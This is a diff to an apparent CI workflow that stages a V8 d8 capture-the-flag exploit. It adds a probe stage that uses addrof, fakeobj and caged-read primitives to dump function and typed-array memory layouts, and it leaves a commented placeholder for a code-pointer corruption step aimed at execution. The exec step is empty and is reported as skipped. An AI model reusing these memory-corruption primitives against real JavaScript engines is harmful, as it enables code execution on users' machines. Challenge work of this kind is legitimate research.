@@ -4201,7 +4201,8 @@ jobs:
           log "Stage B LAYOUT_DUMP_OK=$LAYOUT ABS_RW_OK=$ABS CAGE_SMOKE=$SMOKE rc=$RC in_container=$IN_CT"
           exit 0
 
-      - name: Test 11 — Stage C in-process exec marker (informational)
+
+      - name: Test 11 — Stage C exec surface probes (honest matrix)
         id: stage_c
         run: |
           set +e
@@ -4209,11 +4210,16 @@ jobs:
           ts() { date -u +"%Y-%m-%dT%H:%M:%SZ"; }
           banner() { echo ""; echo "######################################################################"; echo "# $(ts)  $*"; echo "######################################################################"; }
           log() { echo "[$(ts)] $*"; }
-          banner "TEST 11 / STAGE C — exec marker (requires abs R/W; skipped until then)"
+          banner "TEST 11 / STAGE C — exec test matrix (no fake ACE)"
           mkdir -p /tmp/out
           if ! docker exec "$CONTAINER" true 2>/dev/null; then docker start "$CONTAINER" 2>/dev/null || true; sleep 2; fi
-          if [ ! -f /tmp/poc_test_poly.js ] && [ -f /tmp/poc_test.js ]; then
-            { echo 'if (typeof print === "undefined") { globalThis.print = function(){ console.log.apply(console, arguments); }; }'; cat /tmp/poc_test.js; } > /tmp/poc_test_poly.js
+          docker exec "$CONTAINER" sh -c 'mkdir -p /tmp /workspace' 2>/dev/null || true
+          if [ ! -s /tmp/poc_test_poly.js ] && [ -s /tmp/poc_test.js ]; then
+            {
+              echo '// Polyfill: challenge d8 strips print/load/quit'
+              echo 'globalThis.print = function(...args) { console.log(...args); };'
+              cat /tmp/poc_test.js
+            } > /tmp/poc_test_poly.js
           fi
           python3 - <<'PY'
           from pathlib import Path
@@ -4221,16 +4227,130 @@ jobs:
           base = Path("/tmp/poc_test_poly.js").read_text()
           base = re.sub(
               r"caged_write_unsafe\s*\([^;]*\)\s*;?",
-              "/* caged_write_unsafe stripped for Stage C */",
+              "/* caged_write_unsafe stripped for Stage C exec probes */",
               base,
           )
+          # Stage C matrix: probe everything useful for exec WITHOUT claiming success
           probe = r"""
-          // ===== STAGE C: exec marker (only if absolute R/W available) =====
+          // ===== STAGE C: exec surface test matrix =====
           (function stageC() {
             print("[*] STAGE_C_BEGIN");
-            // Honest no-op until ABS_RW_OK is implemented with measured offsets for this d8.
-            let nonce = "pwn_" + (0xC0DEC0DE >>> 0).toString(16);
-            print("[*] STAGE_C_SKIPPED reason=no_verified_abs_rw nonce_would_be=" + nonce);
+            print("[*] Goal: inventory exec-related surfaces; EXEC_MARKER_OK only with real marker");
+
+            function hex(x) { return "0x" + ((x >>> 0).toString(16)); }
+            function safe(fn, label) {
+              try { return { ok: true, v: fn() }; }
+              catch (e) { print("[!] " + label + " err=" + e); return { ok: false, v: null }; }
+            }
+
+            // --- C0: primitives present? ---
+            print("[*] C0_PRIMITIVES");
+            if (typeof instance === "undefined" || !instance.exports) {
+              print("[-] STAGE_C_NO_INSTANCE");
+              print("[*] EXEC_MARKER_OK=0");
+              print("[*] STAGE_C_END");
+              return;
+            }
+            let ex = instance.exports;
+            let need = ["addrof", "fakeobj", "caged_read", "caged_write"];
+            for (let i = 0; i < need.length; i++) {
+              print("[+] export " + need[i] + "=" + (typeof ex[need[i]]));
+            }
+            let addrof = ex.addrof, fakeobj = ex.fakeobj, caged_read = ex.caged_read, caged_write = ex.caged_write;
+            function safe_read(off) {
+              try { return caged_read(off|0)|0; } catch (e) { return null; }
+            }
+
+            // --- C1: WebAssembly API still available in this d8? ---
+            print("[*] C1_WASM_API");
+            print("[+] typeof WebAssembly=" + typeof WebAssembly);
+            if (typeof WebAssembly !== "undefined") {
+              let keys = Object.getOwnPropertyNames(WebAssembly);
+              print("[+] WebAssembly keys=" + keys.join(","));
+              // Minimal wasm module (empty) compile probe
+              try {
+                // (module) empty
+                let bytes = new Uint8Array([0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00]);
+                let m = new WebAssembly.Module(bytes);
+                let i = new WebAssembly.Instance(m);
+                print("[+] WASM_EMPTY_INSTANTIATE_OK");
+              } catch (e) {
+                print("[!] WASM_EMPTY_INSTANTIATE_FAIL " + e);
+              }
+            } else {
+              print("[-] WASM_API_MISSING");
+            }
+
+            // --- C2: Worker / other natives that sometimes help ---
+            print("[*] C2_NATIVE_SURFACES");
+            print("[+] typeof Worker=" + typeof Worker);
+            print("[+] typeof SharedArrayBuffer=" + typeof SharedArrayBuffer);
+            print("[+] typeof Atomics=" + typeof Atomics);
+            print("[+] typeof WebAssembly.Memory=" + typeof (WebAssembly && WebAssembly.Memory));
+            try {
+              if (typeof WebAssembly !== "undefined" && WebAssembly.Memory) {
+                let mem = new WebAssembly.Memory({ initial: 1 });
+                print("[+] WASM_MEMORY_OK bytes=" + mem.buffer.byteLength);
+              }
+            } catch (e) {
+              print("[!] WASM_MEMORY_FAIL " + e);
+            }
+
+            // --- C3: JSFunction / code-pointer candidate dump via cage ---
+            print("[*] C3_FUNCTION_LAYOUT_DUMP");
+            function dummy_exec_probe() { return 0x1337; }
+            let faddr = 0;
+            try { faddr = addrof(dummy_exec_probe)|0; print("[+] addrof(function)=" + hex(faddr)); }
+            catch (e) { print("[!] addrof(function) " + e); }
+            if (faddr) {
+              let line = "function @" + hex(faddr) + " :";
+              for (let d = -0x20; d <= 0xc0; d += 4) {
+                let v = safe_read((faddr + d)|0);
+                if (v === null) continue;
+                line += " [" + d + "]=" + hex(v);
+              }
+              print(line);
+              print("[+] C3_FUNCTION_DUMP_OK");
+            }
+
+            // --- C4: ArrayBuffer / TypedArray dump (exec often needs abs RW via these) ---
+            print("[*] C4_TYPEDARRAY_LAYOUT_DUMP");
+            let ab = new ArrayBuffer(0x100);
+            let u32 = new Uint32Array(ab);
+            u32[0] = 0x11111111; u32[1] = 0x22222222;
+            let a_ab = 0, a_u32 = 0;
+            try { a_ab = addrof(ab)|0; a_u32 = addrof(u32)|0; } catch (e) { print("[!] addrof ab/u32 " + e); }
+            print("[+] addrof(ab)=" + hex(a_ab) + " addrof(u32)=" + hex(a_u32));
+            if (a_u32) {
+              let line = "u32 @" + hex(a_u32) + " :";
+              for (let d = -0x20; d <= 0x80; d += 4) {
+                let v = safe_read((a_u32 + d)|0);
+                if (v === null) continue;
+                line += " [" + d + "]=" + hex(v);
+              }
+              print(line);
+              print("[+] C4_TYPEDARRAY_DUMP_OK");
+            }
+
+            // --- C5: prerequisite abs R/W (must be implemented with measured offsets) ---
+            print("[*] C5_ABS_RW_PREREQ");
+            // Placeholder: set true only when read32/write32 verified against known constant
+            let ABS_RW_READY = false;
+            print("[*] ABS_RW_READY=" + (ABS_RW_READY ? 1 : 0));
+            if (!ABS_RW_READY) {
+              print("[*] STAGE_C_SKIPPED reason=no_verified_abs_rw");
+              print("[*] EXEC_ATTEMPT=0");
+              print("[*] EXEC_MARKER_OK=0");
+              print("[*] STAGE_C_END");
+              return;
+            }
+
+            // --- C6: exec attempt (only reached if ABS_RW_READY) ---
+            // When implementing: corrupt WASM/code pointer, invoke, print:
+            //   print("PWNED_MARKER=" + nonce);
+            print("[*] C6_EXEC_ATTEMPT");
+            print("[*] EXEC_ATTEMPT=1");
+            // Intentionally empty until offsets exist
             print("[*] EXEC_MARKER_OK=0");
             print("[*] STAGE_C_END");
           })();
@@ -4255,12 +4375,24 @@ jobs:
             echo "Error: poc_stage_c.js missing in container" > /tmp/out/test11.combined
           fi
           echo "test11_rc=$RC" | tee -a /tmp/out/test11.result
-          tail -80 /tmp/out/test11.combined
-          EXEC=0; grep -q 'EXEC_MARKER_OK=1' /tmp/out/test11.combined && EXEC=1
+          echo "===== STAGE C combined ====="
+          cat /tmp/out/test11.combined
+          # Score probes (informational)
+          C1=0; grep -q 'WASM_EMPTY_INSTANTIATE_OK' /tmp/out/test11.combined && C1=1
+          C3=0; grep -q 'C3_FUNCTION_DUMP_OK' /tmp/out/test11.combined && C3=1
+          C4=0; grep -q 'C4_TYPEDARRAY_DUMP_OK' /tmp/out/test11.combined && C4=1
           SKIP=0; grep -q 'STAGE_C_SKIPPED' /tmp/out/test11.combined && SKIP=1
-          echo "EXEC_MARKER_OK=$EXEC" | tee -a /tmp/out/test11.result
-          echo "STAGE_C_SKIPPED=$SKIP" | tee -a /tmp/out/test11.result
-          log "Stage C EXEC_MARKER_OK=$EXEC SKIPPED=$SKIP in_container=$IN_CT"
+          EXEC=0; grep -q 'EXEC_MARKER_OK=1' /tmp/out/test11.combined && EXEC=1
+          ATTEMPT=0; grep -q 'EXEC_ATTEMPT=1' /tmp/out/test11.combined && ATTEMPT=1
+          {
+            echo "EXEC_PROBE_WASM=$C1"
+            echo "EXEC_PROBE_FUNC_DUMP=$C3"
+            echo "EXEC_PROBE_TA_DUMP=$C4"
+            echo "EXEC_ATTEMPT=$ATTEMPT"
+            echo "EXEC_MARKER_OK=$EXEC"
+            echo "STAGE_C_SKIPPED=$SKIP"
+          } | tee -a /tmp/out/test11.result
+          log "Stage C WASM=$C1 FUNC=$C3 TA=$C4 ATTEMPT=$ATTEMPT MARKER=$EXEC SKIP=$SKIP"
           exit 0
 
       - name: Test 12 — Stage D flag path (real /flag or labeled sim)
@@ -4416,6 +4548,9 @@ jobs:
           B_IN=0; grep -q 'STAGE_B_IN_CONTAINER=1' /tmp/out/test10.result 2>/dev/null && B_IN=1
           EXEC=0; grep -q 'EXEC_MARKER_OK=1' /tmp/out/test11.result 2>/dev/null && EXEC=1
           SKIP=0; grep -q 'STAGE_C_SKIPPED=1' /tmp/out/test11.result 2>/dev/null && SKIP=1
+          EW=0; grep -q 'EXEC_PROBE_WASM=1' /tmp/out/test11.result 2>/dev/null && EW=1
+          EF=0; grep -q 'EXEC_PROBE_FUNC_DUMP=1' /tmp/out/test11.result 2>/dev/null && EF=1
+          ET=0; grep -q 'EXEC_PROBE_TA_DUMP=1' /tmp/out/test11.result 2>/dev/null && ET=1
           REALF=0; grep -q 'REAL_FLAG_HIT=1' /tmp/out/test12.result 2>/dev/null && REALF=1
           SIMF=0; grep -q 'CATFLAG_PROTOCOL_SIM=1' /tmp/out/test12.result 2>/dev/null && SIMF=1
           log "EXTRA FLAG=$FLAG EXT=$EXT FILEB=$FILEB MULTI=$MULTI LAYOUT=$LAYOUT ABS=$ABS SMOKE=$SMOKE B_IN=$B_IN EXEC=$EXEC SKIP=$SKIP REALF=$REALF SIMF=$SIMF"
@@ -4433,6 +4568,7 @@ jobs:
             echo "- **L2 Stage B** cage write smoke OK: $SMOKE"
             echo "- **L2 Stage B** absolute R/W OK: $ABS (requires measured offsets)"
             echo "- **L3 Stage C** exec marker OK: $EXEC / skipped: $SKIP"
+            echo "- **L3 Stage C** probes WASM=$EW FUNC_DUMP=$EF TA_DUMP=$ET"
             echo "- **L4 Stage D** REAL flag via existing /flag: $REALF"
             echo "- **L4 Stage D** protocol sim only (not exploit): $SIMF"
           } >> "$GITHUB_STEP_SUMMARY"
